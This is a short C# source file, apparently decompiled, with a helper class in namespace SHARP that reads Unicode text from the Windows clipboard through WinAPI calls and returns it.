using System;
using System.Runtime.InteropServices;

namespace SHARP
{
    internal class Buffers
    {
      private const uint CF_UNICODETEXT = 13;

      public static string GetBuffer()
      {
        if (!WinAPI.IsClipboardFormatAvailable(13U) || !WinAPI.OpenClipboard(IntPtr.Zero))
          return (string) null;
        string buffer = string.Empty;
        IntPtr clipboardData = WinAPI.GetClipboardData(13U);
        if (!clipboardData.Equals((object) IntPtr.Zero))
        {
          IntPtr num = WinAPI.GlobalLock(clipboardData);
          if (!num.Equals((object) IntPtr.Zero))
          {
            try
            {
              buffer = Marshal.PtrToStringUni(num);
              WinAPI.GlobalUnlock(num);
            }
            catch (Exception ex)
            {
              Console.WriteLine((object) ex);
            }
          }
        }
        WinAPI.CloseClipboard();
        return buffer;
      }
    }
}
